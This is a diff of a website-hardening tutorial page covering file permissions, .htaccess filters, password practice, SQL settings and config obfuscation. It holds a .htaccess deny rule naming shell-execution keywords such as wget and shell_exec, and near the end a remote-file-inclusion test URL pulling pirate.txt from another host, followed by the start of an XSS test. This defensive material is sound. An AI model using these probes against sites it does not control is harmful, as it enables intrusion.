@@ -12,6 +12,7 @@
 <link rel="alternate" type="application/rss+xml" href="https://silomia.github.io/en-rss.xml" title="Silomia English">
 <link rel="alternate" hreflang="fr" href="https://silomia.github.io/internet-se-proteger-des-pirates-et-hackers.html">
 <link rel="alternate" hreflang="en" href="https://silomia.github.io/en-internet-secure-protect-from-hacker-attacks.html">
+<link rel="canonical" href="https://silomia.gitlab.io/en-internet-secure-protect-from-hacker-attacks.html">
 <link rel="preload" href="css/styles.min.css" as="style">
 <link rel="preload" href="js/script.min.js" as="script">
 <link rel="preload" href="fonts/silomia-inter-light.woff2" as="font" type="font/woff2" crossorigin="anonymous">
@@ -113,7 +114,7 @@
 </tr>
 </tbody>
 </table></p>
-<a id="intro"></a><hr><br>
+						<a id="intro"></a><hr><br>
 						<header>
 							<h2>Introduction</h2>
 						</header>
@@ -126,13 +127,13 @@
 						<p>So we are going to try to guard against these automatic attacks. These tips only concern websites using a CMS, blog or e-commerce, etc. coded by computer experts or by you.</p>
 						<p><strong class="vert">TIP NUMBER ONE:</strong> your CMS, blog or e-commerce must be up to date. You will follow the security updates and install them without delay.</p>
 						<p><strong class="vert">TIP NUMBER 2: THE MOST IMPORTANT RULES</strong> <br>
-As this tutorial is lengthy, here are the rules that should be applied in priority. You can include the others later.<br>
-<strong>1-</strong> Assign chmod 404 permission to files and chmod 505 permission to folders via FTP. <a href="#chmod">See the article below.</a> <strong>This is, without a doubt, the most effective and essential rule.</strong></p>
+						As this tutorial is lengthy, here are the rules that should be applied in priority. You can include the others later.<br>
+						<strong>1-</strong> Assign chmod 404 permission to files and chmod 505 permission to folders via FTP. <a href="#chmod">See the article below.</a> <strong>This is, without a doubt, the most effective and essential rule.</strong></p>
 						<p><strong>2-</strong> The dashboard or the administration interface of your blog, CMS or e-commerce is protected by a login and a complex password. However, its resistance to attack depends on the technical choices (and flaws) of the developer. Against this, add a second protection by <a href="#dossierpasse">.htaccess password.</a> If a hacker manages to bypass the first security, he will come up against a second wall. <strong>This double defence is an armour against automatic attacks.</strong></p>
 						<p><strong>3-</strong> htaccess filtering rules. They allow you to stop many attacks before hitting your website. <a href="#htaccess">See the article here.</a> Their effectiveness will be excellent but they are based on <strong>hacker behaviours and techniques that evolve</strong> over the years. These protections will never be absolute.</p>
 						<p>If you can combine the first three rules, or at least only the first two, <strong class="vert"> you will build a real fortress!</strong></p>
 						<p><strong>4-</strong> Rules for backing up and restoring your website. First, check which files the hacker has added or modified by installing <a href="#fichmodif">this script</a>. Second, are you able to completely erase your website to remove all hacker traces and reactivate everything within 30 minutes? Here's how. <a href="en-internet-backup-restore-files-web-sql.html">Read the article here</a>.</p>
-<a id="chmod"></a><hr><br>
+						<a id="chmod"></a><hr><br>
 						<header>
 							<h2>Write, read and execute permissions.</h2>
 						</header>
@@ -140,14 +141,14 @@ As this tutorial is lengthy, here are the rules that should be applied in priori
 						<p>Read more here: <a href="https://en.wikipedia.org/wiki/Chmod">Description of the CHMOD and the meaning of the numbers.</a></p>
 						<p>Be careful, these rules may work for some hosts and not for others. Give it a try, it is really worth it.</p>
 						<p>We are used to saying that we have to assign by FTP the permission 644 to a file and 755 to a folder.<br>
-In fact, some hosts (but not all) don't seem to use <em>group</em>. So we could very well use 604 permission for a file and 705 permission for a folder. If an attacker enters the system with a <em>group</em> permission, he will not have access to anything, neither read nor write.</p>
+						In fact, some hosts (but not all) don't seem to use <em>group</em>. So we could very well use 604 permission for a file and 705 permission for a folder. If an attacker enters the system with a <em>group</em> permission, he will not have access to anything, neither read nor write.</p>
 						<p>We can go further. Let's protect sensitive parts of your CMS, blog or e-commerce, such as the config.php and .htaccess file by giving it 404 (or 444) permission. No one will be able to modify it, not even you (this is absolutely wrong if your site has a big security hole, but it is unstoppable against an automatic attack). You will only be able to do it by FTP when you really need to modify it.</p>
 						<p><strong>This is how I protect my site:</strong><br>
-All files have 404 (or 444) permission.<br>
-All folders have 505 (or 555) permission.<br>
-If a file or folder requires writing permission by the server, set 604 for the file and 705 for the folder. No need to do the famous 777 (all rights to everyone) which is a public danger, a provocation to hacking because you announce that your house is wide open, without doors or windows, anyone can help himself.<br>
-The config and htaccess files have 404 (or 444) permission.<br>
-The folder “www” or “public_html” <strong>must</strong> be in chmod 705 or 755 depending on your host, never change it.</p>
+						All files have 404 (or 444) permission.<br>
+						All folders have 505 (or 555) permission.<br>
+						If a file or folder requires writing permission by the server, set 604 for the file and 705 for the folder. No need to do the famous 777 (all rights to everyone) which is a public danger, a provocation to hacking because you announce that your house is wide open, without doors or windows, anyone can help himself.<br>
+						The config and htaccess files have 404 (or 444) permission.<br>
+						The folder “www” or “public_html” <strong>must</strong> be in chmod 705 or 755 depending on your host, never change it.</p>
 						<p><strong>Advantage:</strong> nobody can modify your files. <strong>Disadvantage:</strong> you have to change the write permission (644 and 755) if you update your CMS, blog or e-commerce and give the proper permission 404 (or 444) and 505 (or 555) afterwards. It takes 10 minutes, but it is worth it. If your web host doesn't allow you to do this, move to another one.</p>
 						<p><strong>Why is this so important?</strong> The hacker is trying to install a file on your site in order to take control of it (to delete the site, to put files for phishing or a script that sends spam, etc.). He is looking for security holes so that he can save his takeover file on your server. If your website has a security hole, the hacker will exploit it, but since your website only has folders and files that are write-prohibited, he won't be able to save anything. His attack will not work. <strong>If there was only one rule to apply it would be this one, without a doubt the most effective and essential one.</strong></p>
 						<p>The easiest way is to use your FTP software, display the information about a file or folder and your software will provide the option to change permission. Another effective method, if you have many files, is to connect using SSH (see its description below). Otherwise, here is a small PHP script that will allow you to perform this operation very simply. You save this file in your web hosting, open it from your browser, enter the path to the folder you want to process, and choose the CHMOD settings for all files and folders included in this directory. A detailed report will give you the results. Once the operation is completed, delete this file to prevent unintended use.</p>
@@ -237,11 +238,11 @@ The folder “www” or “public_html” <strong>must</strong> be in chmod 705 
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 						<p>It is possible to speed up the change of permission with SSH by automating this action. Your webhost must give you access to an SSH connection.<br>
-With a script that does <a href="http://sourceforge.net/projects/shcmd/">pseudo-ssh in PHP</a>, put the file in the “www” or “public_html” folder and start working.<br>
-Changing all permissions via FTP of all files and folders can be time consuming and tedious with the risk of forgetting some of them. I use the command lines below to quickly change permission via SSH.</p>
+						With a script that does <a href="http://sourceforge.net/projects/shcmd/">pseudo-ssh in PHP</a>, put the file in the “www” or “public_html” folder and start working.<br>
+						Changing all permissions via FTP of all files and folders can be time consuming and tedious with the risk of forgetting some of them. I use the command lines below to quickly change permission via SSH.</p>
 						<p>Login to your account using SSH, then go to the “www” (or “public_html”) folder by entering the cd command www , and enter the following commands in a single line (after modifying the names of files and folders as needed):<br>
-In SSH mode, put yourself in the “www” or “public_html” directory before starting.<br>
-Copy one line, press the Enter key, and copy another line, press the Enter key, etc. after changing the names of the files and folders as needed.</p>
+						In SSH mode, put yourself in the “www” or “public_html” directory before starting.<br>
+						Copy one line, press the Enter key, and copy another line, press the Enter key, etc. after changing the names of the files and folders as needed.</p>
 						<p>All files have 404 or 444 permission (<em>read permission, no write permission</em>):</p>
 <span class="smallfont">Code:</span>
 <pre class="smallfont code">find . -type f -print0 | xargs -0 chmod 404</pre>
@@ -264,7 +265,7 @@ Copy one line, press the Enter key, and copy another line, press the Enter key, 
 <span class="smallfont">Code:</span>
 <pre class="smallfont code">find /home/loginftp/www/forum -type d -name &quot;*upload*&quot; -print0 | xargs -0 chmod 705</pre>
 <p><a href="https://en.wikipedia.org/wiki/Chmod">An article on the meaning of CHMOD and the meaning of numbers.</a></p>
-<a id="htaccess"></a><hr><br>
+						<a id="htaccess"></a><hr><br>
 						<header>
 							<h2>The .htaccess file</h2>
 						</header>
@@ -308,7 +309,7 @@ Copy one line, press the Enter key, and copy another line, press the Enter key, 
 <span style="color: #008000">RewriteCond</span> %{REQUEST_METHOD} ^(DELETE|PUT|PATCH) [NC,F]
 </pre></div>
 						<p><strong>5-</strong> Some files are only allowed to be displayed, others are not. The index.php file is the default file. If we display index.htm, it doesn't work. The purpose is to prohibit the pirate to display on his browser a file or a file format that is not authorized. <strong class="vert">-= <u>VERY</u> <u>VERY</u> <u>VERY</u> EFFECTIVE BUT TO BE TESTED AND ADAPTED TO YOUR INSTALLATION =-</strong><br>
-Caution: these prohibitions must be tested and adapted if necessary.</p>
+						Caution: these prohibitions must be tested and adapted if necessary.</p>
 <span class="smallfont">Code:</span>
 <!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### ONLY THE index.php FILE IS SERVICED AS THE FIRST FILE BY DEFAULT. THE OTHERS ARE FORBIDDEN</span>
 <span style="color: #008000">DirectoryIndex</span> index.php
@@ -398,12 +399,12 @@ Caution: these prohibitions must be tested and adapted if necessary.</p>
 <span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)(wget|shell_exec|passthru|system|exec|popen|proc_open)(.*)$
 <span style="color: #008000">RewriteRule</span> (.*) [F]
 </pre></div>
-<p><strong>Don't set these rules all at once.</strong><br>
-Copy one, then test your CMS, blog or e-commerce by adding, modifying a page, add or delete a user, access your administration interface and do several things. If everything is OK, put another rule. In case of a problem, look at the URL called. There may be a keyword that is blocked by the .htaccess file. You will have to delete this keyword from the .htaccess file. You understood it, this system filters the URL and looks if it is in accordance with a normal use. So, if you get an error message, find the keyword that blocks the request.<br>
-You have to adapt these rules to your case, it is not a simple copy and paste.</p>
+						<p><strong>Don't set these rules all at once.</strong><br>
+						Copy one, then test your CMS, blog or e-commerce by adding, modifying a page, add or delete a user, access your administration interface and do several things. If everything is OK, put another rule. In case of a problem, look at the URL called. There may be a keyword that is blocked by the .htaccess file. You will have to delete this keyword from the .htaccess file. You understood it, this system filters the URL and looks if it is in accordance with a normal use. So, if you get an error message, find the keyword that blocks the request.<br>
+						You have to adapt these rules to your case, it is not a simple copy and paste.</p>
 						<p>Later, when using your CMS, blog or e-commerce, you see a 403 error, then it is likely that a filtering rule is active.</p>
 						<p>Finally, your CMS, blog or e-commerce often uses the .htaccess file to include more readable URL rewriting rules. Set the hacker filters first and the URL rewriting rules at the end. This is because the filters apply from the first to the last. Placing the anti-hacker filters after the URL rewriting rules of your CMS, blog or e-commerce would not bring any benefit (this is not 100% true, but there are reasons).</p>
-<a id="fichmodif"></a><hr><br>
+						<a id="fichmodif"></a><hr><br>
 						<header>
 							<h2>Have the list of modified and added files</h2>
 						</header>
@@ -411,8 +412,8 @@ You have to adapt these rules to your case, it is not a simple copy and paste.</
 						<p>If you have been hacked, you will find out which files have been added and which ones have been modified by the hacker with the date and time. So, by comparing the date of these modified files to the logs, you will know if the editing is normal or not and you will know when and how the hacker hit.</p>
 						<p>It is also used to understand the behaviour of a script or a CMS, blog, wiki and see which files have been manipulated by this software.</p>
 						<p>Copy the code below and create a text file that you can call for example: list-modif.php<br>
-Put this script in your hosting in the folder “www” or “public_html”, open it with your web browser, enter the number of days representing the period to be checked, then the name of the folder to be scanned. The file path must end with / as for example “/forum/” which will correspond to “/home/yourloginftp/www/forum/”.<br>
-If you want to check the entire contents of the “www” or “public_html” folder, just click on the “Check Files” button.</p>
+						Put this script in your hosting in the folder “www” or “public_html”, open it with your web browser, enter the number of days representing the period to be checked, then the name of the folder to be scanned. The file path must end with / as for example “/forum/” which will correspond to “/home/yourloginftp/www/forum/”.<br>
+						If you want to check the entire contents of the “www” or “public_html” folder, just click on the “Check Files” button.</p>
 						<p>Be careful, if you have a lot of files and directories, the listing may take too much time to complete and the script may stop after 30 seconds of execution. If this is the case, try to search directory by directory.</p>
 						<p>This script will only list folders from the path “/home/yourloginftp/www/” or “/home/yourloginftp/public_html/” of your hosting. Once the operation is completed, delete this file to avoid any unintended use.</p>
 						<p>You can get this PHP file here: <a href="depot/modif-en.zip">modif-en.zip (2.1 KB)</a></p>
@@ -493,14 +494,14 @@ If you want to check the entire contents of the “www” or “public_html” f
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 
-<a id="gesfic"></a><hr><br>
+						<a id="gesfic"></a><hr><br>
 						<header>
 							<h2>File manager to control your web space</h2>
 						</header>
 						<p>This file manager written in PHP allows you to manipulate the content of a web space, as you would do by FTP. You can create, read, delete, compress, decompress, change rights, rename files and folders. Its interface is simplistic but efficient.</p>
 						<p>It is with this kind of script that the hacker modifies your site when he succeeds in exploiting a security flaw by sending his file to your hosting.</p>
 						<p>Copy the code below and create a text file that you can call for example gesfic.php<br>
-Put this script in your hosting in the folder “www” or “public_html” or elsewhere, and open it with your web browser.</p>
+						Put this script in your hosting in the folder “www” or “public_html” or elsewhere, and open it with your web browser.</p>
 						<p>The manager gives read and write access to all the space of your hosting. Once the operation is completed, delete this file to avoid any unintended use.</p>
 						<p>You can get this PHP file here: <a href="depot/gesfic-en.zip">gesfic-en.zip (4.4 KB)</a></p>
 <span class="smallfont">Code PHP:</span>
@@ -904,56 +905,56 @@ Put this script in your hosting in the folder “www” or “public_html” or 
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 
-<a id="motpasse"></a><hr><br>
+						<a id="motpasse"></a><hr><br>
 						<header>
 							<h2>Passwords</h2>
 						</header>
 						<p>Protect your passwords.<br>
-They can try to penetrate your hosting by guessing your FTP or SQL password. If you change the passwords, please respect the following rules:<br>
-<strong>1-</strong> A password must be at least 12 characters long, the longer the better.<br>
-<strong>2-</strong> It should never be a word found in the dictionary of any language. Password cracking software has dictionaries of hundreds of thousands of words of all languages and searches for all combinations. It takes from a few minutes to a few hours to crack these passwords very easily.<br>
-<strong>3-</strong> A good password contains upper- and lower-case letters, numbers and non-alphanumeric characters (such as punctuation marks).<br>
-<strong>4-</strong> <strong>NEVER USE THE SAME PASSWORD for FTP, SQL database, e-mail, website administration interface</strong>. The hacker <strong>KNOWS</strong> that if he finds your password, chances are it is the same password somewhere else. Many hosting providers offer a unique password to “simplify” the management.</p>
+						They can try to penetrate your hosting by guessing your FTP or SQL password. If you change the passwords, please respect the following rules:<br>
+						<strong>1-</strong> A password must be at least 12 characters long, the longer the better.<br>
+						<strong>2-</strong> It should never be a word found in the dictionary of any language. Password cracking software has dictionaries of hundreds of thousands of words of all languages and searches for all combinations. It takes from a few minutes to a few hours to crack these passwords very easily.<br>
+						<strong>3-</strong> A good password contains upper- and lower-case letters, numbers and non-alphanumeric characters (such as punctuation marks).<br>
+						<strong>4-</strong> <strong>NEVER USE THE SAME PASSWORD for FTP, SQL database, e-mail, website administration interface</strong>. The hacker <strong>KNOWS</strong> that if he finds your password, chances are it is the same password somewhere else. Many hosting providers offer a unique password to “simplify” the management.</p>
 						<p>Some softwares create unique and random passwords and manage them for you (look at <a href="https://bitwarden.com">Bitwarden</a>, <a href="https://www.keepassx.org">KeepassX</a> and <a href="https://keepass.info">Keepass</a>, <a href="https://1password.com/">1Password</a>, <a href="https://www.dashlane.com/">Dashlane</a>, <a href="https://www.lastpass.com/fr">LastPass</a>…). That is the best solution because you don't have to memorize anything. <br>
 						You can create this list yourself in a password-protected file and copy and paste the data for each login form. To simplify this task, you can also choose to trust your web browser to save your unique passwords, synchronize your data between your devices and fill in the form field for you each time you log in with the correct password. To generate these unique passwords, see for example these websites:<br>
 						<a href="https://www.motdepasse.xyz">https://www.motdepasse.xyz</a><br>
-<a href="https://www.vpnmentor.com/tools/secure-password-generator/">https://www.vpnmentor.com/tools/secure-password-generator/</a><br>
+						<a href="https://www.vpnmentor.com/tools/secure-password-generator/">https://www.vpnmentor.com/tools/secure-password-generator/</a><br>
 						<a href="https://www.comparitech.com/privacy-security-tools/password-strength-test/">https://www.comparitech.com/privacy-security-tools/password-strength-test/</a></p> 
 						<p> These websites offer phonetic passwords, creating words that are easy to remember:<br>
-<a href="https://www.dashlane.com/features/password-generator">https://www.dashlane.com/features/password-generator</a> (Dashlane)<br>
-<a href="https://www.lastpass.com/password-generator">https://www.lastpass.com/password-generator</a> (LastPass)<br>
-<a href="https://tools.arantius.com/password">https://tools.arantius.com/password</a></p>
+						<a href="https://www.dashlane.com/features/password-generator">https://www.dashlane.com/features/password-generator</a> (Dashlane)<br>
+						<a href="https://www.lastpass.com/password-generator">https://www.lastpass.com/password-generator</a> (LastPass)<br>
+						<a href="https://tools.arantius.com/password">https://tools.arantius.com/password</a></p>
 						<p>To be sure that a memorable or phonetic password does not exist in any language, type it in part or in full in a search engine. If it returns no results, then your password is not a dictionary word.</p>
-<a id="installsql"></a><hr><br>
+						<a id="installsql"></a><hr><br>
 						<header>
 							<h2>Installing an SQL database</h2>
 						</header>
 						<p>When you install your CMS, blog or e-commerce for the first time, it comes with default settings and parameters that we accept each time. In case of a flaw, the hacker can use these default settings and parameters to penetrate your SQL database and modify it.</p>
 						<p>Here are a few tips to prevent this kind of SQL injection attack from being possible. There are several types of SQL injections. Rule 3 of .htaccess stops another form. Otherwise, the real protection against SQL injections is good coding.</p>
 						<p><strong>1-</strong> When you install your CMS, blog or e-commerce, it provides the login “admin” and asks you to enter a password. If possible, change “admin” for something else, a nickname for example. A hacker knows that the default login is “admin” and will run his scripts only on the password. But if the login “admin” does not exist, he has no chance to penetrate the system.<br>
-Sometimes you have to make this modification in phpMyadmin. But be careful, you must be sure that it will not break your database. Ask the question on the editor's forum of your CMS, blog or e-commerce to find out if it is possible.</p>
+						Sometimes you have to make this modification in phpMyadmin. But be careful, you must be sure that it will not break your database. Ask the question on the editor's forum of your CMS, blog or e-commerce to find out if it is possible.</p>
 						<p><strong>2-</strong> The first user is therefore the administrator and always has the ID 1. In the event that the login is not “admin”, some scripts may try to find out the password of user number 1, which is, in 99.99% of cases, the administrator. If possible, delete user number 1 on the list and be the administrator with the number 2 or 15 or 250.<br>
-Sometimes you have to make this modification in phpMyadmin. But be careful, you must be sure that it will not break your database. Ask the question on the editor's forum of your CMS, blog or e-commerce to find out if it is possible.</p>
+						Sometimes you have to make this modification in phpMyadmin. But be careful, you must be sure that it will not break your database. Ask the question on the editor's forum of your CMS, blog or e-commerce to find out if it is possible.</p>
 						<p><strong>3-</strong> During installation, your CMS, blog or e-commerce asks you to choose a prefix for the table names. We always accept the default prefix as wp_ for Wordpress, g2_ for Gallery2, dc_ for DotClear, phpbb_ for phpBB, etc. The cracker can search the table with the list of users and their passwords. If, like everyone else, you have not changed the prefix, it will be easy for him to find the table. So, change the prefix of your SQL tables for more security. You can do this after installation. Sometimes it is necessary to do this modification in phpMyadmin. But be careful, you have to be sure that it won't break your database. Ask the question on the editor's forum of your CMS, blog or e-commerce to find out if it is possible.<br>
-For example, with Wordpress in the event you change the prefix after installation, you also need to change 2 entries in the database and in the wp-config.php file, see their forums to know how to do this.</p>
+						For example, with Wordpress in the event you change the prefix after installation, you also need to change 2 entries in the database and in the wp-config.php file, see their forums to know how to do this.</p>
 						<p><strong>My advice: <span style="color:#008080;">ALWAYS CHANGE THE DEFAULT SETTINGS!</span></strong></p>
-<a id="nommage"></a><hr><br>
+						<a id="nommage"></a><hr><br>
 						<header>
 							<h2>File naming</h2>
 						</header>
 						<p>To prevent hacker bots from finding you through Google, change some habits, such as the name and URL of particular files.</p>
 						<p>1- Do not call the contact form page: mail.php or contact.html. Call it something else with its equivalent in other languages. Spam robots will have more trouble finding a contact form to hack and send spam thanks to a flaw in your mail script.<br>
-Do the same thing with other files: no login.php, admin.php, download.php (they will look for the vulnerability to download a file out of its directory), etc. As a general rule, avoid these common English words.</p>
+						Do the same thing with other files: no login.php, admin.php, download.php (they will look for the vulnerability to download a file out of its directory), etc. As a general rule, avoid these common English words.</p>
 						<p>2- Spammers aren't idiots. Also change some of the names on the form. In the INPUT html tags, change the NAME attribute that contains words like “e-mail”, “mail”, “name” or “subject” by their counterpart in other languages. Make this change in the HTML form and in your php or cgi script.</p>
 						<p>3- Avoid giving the name of your CMS, blog or e-commerce directly in the URL such as www.domain.tld/admin/ or www.domain.tld/login/ or www.domain.tld/blog/ or www.domain.tld/forum/ or www.domain.tld/shop/. Spammers and hackers look for these URLs to target for an attack. Be more creative for your security. The best is to avoid the English word and to prefer its equivalent in other languages.</p>
-<a id="cryptconfig"></a><hr><br>
+						<a id="cryptconfig"></a><hr><br>
 						<header>
 							<h2>Encrypt your config.inc.php file</h2>
 						</header>
 						<p>Despite all precautions, the hacker has penetrated your site and is now trying to find out the login and password of your MySQL database in order to hack it, empty it and take control of it. The hacker's task can be complicated by encrypting this sensitive data. The web server will be able to read this information easily, but it will not be readable directly by a human. <br>
-For a PHP expert, this protection only lasts 2 minutes, it makes him work harder, but we are not here to make it easier for him?</p>
+						For a PHP expert, this protection only lasts 2 minutes, it makes him work harder, but we are not here to make it easier for him?</p>
 						<p>Visit this website and encrypt your data. <br>
-<a href="http://www.phpencode.org">www.phpencode.org</a> or <a href="http://www.mobilefish.com/services/php_obfuscator/php_obfuscator.php">www.mobilefish.com/services/php_obfuscator/php_obfuscator.php</a> or look for a “PHP Obfuscator”.</p>
+						<a href="http://www.phpencode.org">www.phpencode.org</a> or <a href="http://www.mobilefish.com/services/php_obfuscator/php_obfuscator.php">www.mobilefish.com/services/php_obfuscator/php_obfuscator.php</a> or look for a “PHP Obfuscator”.</p>
 						<p>For example, my config.php file contains this:</p>
 <span class="smallfont">Code PHP:</span>
 <!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
@@ -965,8 +966,8 @@ For a PHP expert, this protection only lasts 2 minutes, it makes him work harder
 <span style="color: #BC7A00">?&gt;</span>
 </pre></div>
 						<p>I copy the part to be encoded between the tags &lt;?php and ?&gt;<br>
-I choose the "PHP Extrastrength" encoding. Don't look for a higher encoding, I sometimes found errors on web servers.<br>
-I copy the long line that starts with eval(xxxx between tags &lt;? and ?&gt; and paste it into the config.inc.php file, which gives:</p>
+						I choose the "PHP Extrastrength" encoding. Don't look for a higher encoding, I sometimes found errors on web servers.<br>
+						I copy the long line that starts with eval(xxxx between tags &lt;? and ?&gt; and paste it into the config.inc.php file, which gives:</p>
 <span class="smallfont">Code PHP:</span>
 <!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
 <span style="color: #008000; font-weight: bold">eval</span>(<span style="color: #008000">gzuncompress</span>(<span style="color: #008000">gzinflate</span>(<span style="color: #008000">base64_decode</span>(<span style="color: #BA2121">&#39;AW4Akf942k3LTQqAIBQE4H3QHQZp5cYDRDeoRXSAMHyIkFo+K7p9f5t2w3wzSkmJ7hz6Fkw5u2AZUipVFpWZRqa0UwLQQLx5S7zOov40aE/ApyH6STP9dLsP7+LWOVoXfrZo5iMm85iP2dBTkKgv8oMsVg==&#39;</span>)))); 
@@ -974,28 +975,28 @@ I copy the long line that starts with eval(xxxx between tags &lt;? and ?&gt; and
 </pre></div>
 						<p>This way, you can hide all sensitive information.</p>
 						<p>And assign by FTP the permissions 404 or 444 to your config.inc.php file (or equivalent) if possible.</p>
-<a id="cryptmail"></a><hr><br>
+						<a id="cryptmail"></a><hr><br>
 						<header>
 							<h2>Encrypt your email address</h2>
 						</header>
 						<p>If you have no choice but to display an e-mail address on your website, you have 2 solutions:</p>
 						<p><strong>1-</strong> Create an image file (svg, png, jpeg) with your address written on it. It is not text, spam robots will not see it.</p>
 						<p><strong>2-</strong> Encrypt your e-mail address with javascript. I have been using this method for years and these addresses have never been spammed. Go to this website <a href="http://www.jottings.com/obfuscator/">www.jottings.com/obfuscator/</a> or <a href="https://jumk.de/nospam/stopspam.html">jumk.de/nospam/</a> to get your address encrypted.<br>
-To go even further, instead of integrating this code into your html page, we will call it from a javascript file. The advantage is that if the address is present on several pages, you only have to modify once.<br>
-Create a folder called “js” and we will put a file in it called “address.js”. Copy in this file the javascript code line of your encrypted e-mail address which starts with “var …”. For example:</p>
+						To go even further, instead of integrating this code into your html page, we will call it from a javascript file. The advantage is that if the address is present on several pages, you only have to modify once.<br>
+						Create a folder called “js” and we will put a file in it called “address.js”. Copy in this file the javascript code line of your encrypted e-mail address which starts with “var …”. For example:</p>
 <span class="smallfont">Code:</span>
 <pre class="smallfont code">var g6=&quot;&quot;;for(var z1=0;z1&lt;335;z1++)g6+=String.fromCharCode((&quot;{fw%}&lt;B\'m3xnmya\'Bwj {tjxztrst%a\'a\'B kjwm%fA,0.a\'a\'1l4 4-jhfqujw3,?tyqnfr,aaBkjw ,ViqyVj755zaajsVnfrtistr5955zaantr,ztjxztrst%Sa\',aa,0.a\'a\'1l4V4-jhfqujw3str@5955}(+ntrCa\',aa,aaBkjwm3xnmya\'By4-jhfqujw3,Cf4AiqyS@j7}(+jsnfrSti.b5`ba\'a\'`1l4S\'@z5B\'\'@ktw-{fw%u&lt;B5@u&lt;A}&lt;3qjslym@u&lt;0B88.z50B}&lt;3xzgxyw-u&lt;188.3xuqny-\'\'.3wj{jwxj-.3otns-\'\'.@j{fq-z5.&quot;.charCodeAt(z1)-(-59+64)+24+39)%(5*2+85)+-45+77);document.write(eval(g6))</pre>
 <p>Then, in your html page, copy the following code:</p>
 <span class="smallfont">Code HTML:</span>
 <pre class="smallfont code"><span style="color:#800000">&lt;script src=<span style="color:#0000FF">&quot;js/address.js&quot;</span> type=<span style="color:#0000FF">&quot;text/javascript&quot;</span>&gt;</span><span style="color:#800000">&lt;/script&gt;</span></pre>
-<a id="adressmail"></a><hr><br>
+						<a id="adressmail"></a><hr><br>
 						<header>
 							<h2>E-mail addresses to avoid</h2>
 						</header>
 						<p>More to do with spam than hacking, email addresses with the most common prefixes are spammed automatically (because they are more likely to exist). Therefore, avoid creating addresses with the following names:<br>
-webmaster@ admin@ contact@ email@ mail@ info@ sales@ support@ root@ www@ abuse@ news@</p>
+						webmaster@ admin@ contact@ email@ mail@ info@ sales@ support@ root@ www@ abuse@ news@</p>
 						<p>I used contact@ and info@ without ever putting them on the web, but the amount of spam was becoming unbearable. In short, for spam as for hacking, you have to avoid intellectual laziness and default settings.</p>
-<a id="dossierpasse"></a><hr><br>
+						<a id="dossierpasse"></a><hr><br>
 						<header>
 							<h2>Protecting a folder with a password</h2>
 						</header>
@@ -1025,20 +1026,20 @@ webmaster@ admin@ contact@ email@ mail@ info@ sales@ support@ root@ www@ abuse@ 
 </pre></div>
 						<p><strong>Better lock the “administration” directory:</strong><br>
 						Finally, the dashboard or the administration interface of your blog, CMS or e-commerce already has a login and password protection. However, this defence is dependent on the technique used by the developer and can suffer from a security flaw. <strong>Adding a second password system with the “.htaccess” file considerably strengthens the protection to access the dashboard or the administration interface.</strong> This double authentication is not troublesome since web browser software records these passwords. Do not hesitate to use it. Of course, you will use different and complex passwords for both methods! Only brute force attacks can overcome the “.htaccess” password, so you might as well make it long and complicated. And hopefully, your web host will notice this suspicious behaviour and block the attacker in time.</p>
-<a id="robots"></a><hr><br>
+						<a id="robots"></a><hr><br>
 						<header>
 							<h2>The robots.txt file</h2>
 						</header>
 						<p>Do you know the role of the robots.txt file? <a href="http://www.robotstxt.org/">http://www.robotstxt.org</a> This file is used to prevent a search engine from indexing a folder or file.</p>
 						<p>But do not declare in this robots.txt file a directory or file that should remain secret not only from search engines but also from hackers!!! Anyone can read the content of the robots.txt file and thus find the address of your secret folder/file.</p>
 						<p>To keep a folder out of the sight of indexing robots and hackers, it is more effective to protect it with an htaccess password (see above).</p>
-<a id="protcss"></a><hr><br>
+						<a id="protcss"></a><hr><br>
 						<header>
 							<h2>Protect your style.css and index.php files</h2>
 						</header>
 						<p>Protect by FTP your files “style.css” and “index.php” with the permissions 404 or 444. I saw a case of hacking of the style.css file where the hacker had modified this file to display a pop-up.<br>
-Protect also by FTP the file “index.php” with the rights 404 or 444 because it is by him that all the orders of your CMS, blog or e-commerce are made.</p>
-<a id="testweb"></a><hr><br>
+						Protect also by FTP the file “index.php” with the rights 404 or 444 because it is by him that all the orders of your CMS, blog or e-commerce are made.</p>
+						<a id="testweb"></a><hr><br>
 						<header>
 							<h2>How do I test the security of my website?</h2>
 						</header>
@@ -1047,7 +1048,7 @@ Protect also by FTP the file “index.php” with the rights 404 or 444 because 
 						<p><strong class="vert">NOTE 1:</strong> <strong>none of these examples will teach you how to hack a site.</strong> It takes a lot more and it is more complicated than that. However, you will know if your script is poorly coded or not.</p>
 						<p><strong class="vert">Note 2:</strong> Disable the proposed .htaccess filter rules described <a href="#htaccess">above.</a> Indeed, these rules will stop most of the attacks presented below by sending you an error <em>403 Forbidden“</em>. So, to find out if your script is fallible, disable these rules and if there is a flaw, fix the script or install a more secure one.</p>
 						<p><strong>1- Attack by the execution of an external script:</strong><br>
-Create a text file containing the following code:</p>
+						Create a text file containing the following code:</p>
 <span class="smallfont">Code PHP:</span>
 <!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
 <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;Hack me if you can !!!&quot;</span>;
@@ -1066,8 +1067,8 @@ Create a text file containing the following code:</p>
 <span class="smallfont">Code:</span>
 <pre class="smallfont code">http://www.yourdomain.tld/?page=http://www.otherwebsite.tld/pirate.txt?</pre>
 						<p><strong>2- Attack by XSS or Cross Site Scripting:</strong><br>
-We use javascript to take control of your CMS, blog or e-commerce.<br>
-Your URLs look like this (to be adapted to your situation):</p>
+						We use javascript to take control of your CMS, blog or e-commerce.<br>
+						Your URLs look like this (to be adapted to your situation):</p>
 <span class="smallfont">Code:</span>
 <pre class="smallfont code">http://www.yourdomain.tld/?page=123</pre>
 						<p>Replace “123” by some javascript. If it is not filtered, then it is hacked. For example, if it is not filtered:</p>
